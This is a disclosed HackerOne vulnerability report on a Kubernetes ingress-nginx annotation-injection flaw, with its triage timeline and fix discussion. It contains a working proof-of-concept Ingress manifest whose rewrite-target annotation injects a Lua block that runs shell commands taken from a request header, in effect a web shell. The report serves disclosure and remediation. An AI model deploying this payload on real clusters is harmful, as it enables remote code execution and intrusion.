---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/cloud
  - stack/kubernetes
  - stack/nginx
substate: "resolved"
weakness: "Code Injection"
enriched: true
date: 2023-11-24
submitted: 2022-10-10T09:58:57.995Z
bounty_usd: 2500
votes: 57
cve: "CVE-2021-25742", "CVE-2021-25746"
program: "[[programs/kubernetes|Kubernetes]]"
reporter: "suanve"
source: "https://hackerone.com/reports/1728174"
title: "Ingress nginx annotation injection causes arbitrary command execution"
---
# Ingress nginx annotation injection causes arbitrary command execution

> **Severity:** High | **Bounty:** 2,500 USD | **Votes:** 57 | **Program:** Kubernetes | **Disclosed:** 2023-11-24

- Report: [https://hackerone.com/reports/1728174](https://hackerone.com/reports/1728174)
- CWE: Code Injection | CVE: CVE-2021-25742, CVE-2021-25746
- Submitted: 2022-10-10T09:58:57.995Z

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2022-10-17** @h1_analyst_oliver: Hi @suanve,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@h1_analyst_oliver
- **Report Needs More Info**
- **Report New**
- **2022-10-26** @suanve: hi sir, what is the progress of this report?
- **Report Needs More Info**
- **Report New**
- **2022-11-08** @suanve: Hello, how is the report progressing? I would like to see if it is necessary to study this issue in depth .
- **Report Needs More Info**
- **Report New**
- **2022-11-09** @suanve: I have prepared a video hope it can help u.{F2026221}
- **2022-11-18** @suanve: Hello, how is the report progressing?
- **Report Severity Updated**
- **Report Triaged**
- **2023-01-19** @cjcullen: Hi @suanve,

It looks like your configuration sets 
```
data:
  allow-snippet-annotations: "true"
```
The mitigation for [CVE-2021-25742](https://github.com/kubernetes/ingress-nginx/issues/7837) is to set that configuration to false. Does your report still work in the recommended configuration?
- **2023-01-19** @suanve: But you can replace an annotation `nginx.ingress.kubernetes.io/rewrite-target` and it will not be restricted by `allow-snippet-annotations`. I can still perform configuration injection under the security restrictions you mentioned and execute arbitrary code.
You can reproduce it by following the steps below

kubectl edit configmap -n ingress-nginx ingress-nginx-controller
{F2127801}

poc:
su.yaml:
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/rewrite-target: |
      suanve/ last;
      }
      location suanve/ {
        content_by_lua_block {
          local rsfile = io.popen(ngx.req.get_headers()["cmd"]);
          local rschar = rsfile:read("*all");
          ngx.say(rschar);
        }
      }
      location /fs/{
spec:
  rules:
  - host: k8s.suanve.susec.me
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: exploit
            port:
              number: 80


```
{F2127793}

{F2127794}
- **2023-01-28** @suanve: It's been a long time, has there been any progress on this issue?
- **2023-01-30** @h1_analyst_oliver: Hi @suanve,

Thanks for your patience! The Kubernetes team is still working on this internally, and you will be updated once there is more information to share.

Regards,
@h1_analyst_oliver
- **2023-04-12** @suanve: It's been a long time, has there been any progress on this issue?
- **2023-04-15** @h1_analyst_oliver: Hi @suanve,

Thanks for your patience! The Kubernetes team is still working on this internally, and you will be updated once there is more information to share.

Regards,
@h1_analyst_oliver
- **2023-06-19** @suanve: It's been a long time, has there been any progress on this issue?
- **2023-06-19** @h1_analyst_oliver: Hi @suanve,

We still didn't hear back from Kubernetes team, we will let you know once an update is available.

Regards,
@h1_analyst_oliver
- **2023-07-05** @cjcullen: Thank you for your patience. We are still working with the ingress-nginx team on how they would like to fix this issue.
- **2023-08-05** @h1_analyst_oliver: Hi @suanve,

It seems that this issue is fixed here https://github.com/kubernetes/ingress-nginx/pull/7874, and the fix is included in 1.6.4 and 1.7.0. Can you confirm if the issue is fixed?

Regards,
@h1_analyst_oliver
- **2023-08-09** @suanve: Sorry, I've been busy recently and didn't see the message. I reconfigured the latest version of ingress-nginx (looks like 1.8.1) and configured {F2584246} `allow-snippet-annotations: "false"` as requested by kubernetes staff reply
The command is still executed
{F2584245}
- **2023-08-09** @suanve: As for `https://github.com/kubernetes/ingress-nginx/pull/7874` you said, I don’t think this is a good solution, because the people  deploy ingress-nginx cannot be familiar with all the attack syntax,And annotation-value-word-blocklist is not have value by default.
- **Report Severity Updated**
- **Report Retesting**
- **User Completed Retest**
- **2023-09-27** @cjcullen: Also, please set the `--enable-annotation-validation` when testing on 1.9.0
- **Report Retest Approved**
- **Report Triaged**
- **Report Retesting**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Resolved**
- **Report Reopened**
- **Bounty Awarded**
- **2023-10-08** @suanve: Thank you for your reward.
 Please record CVE as suanve. 
Have a good day.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
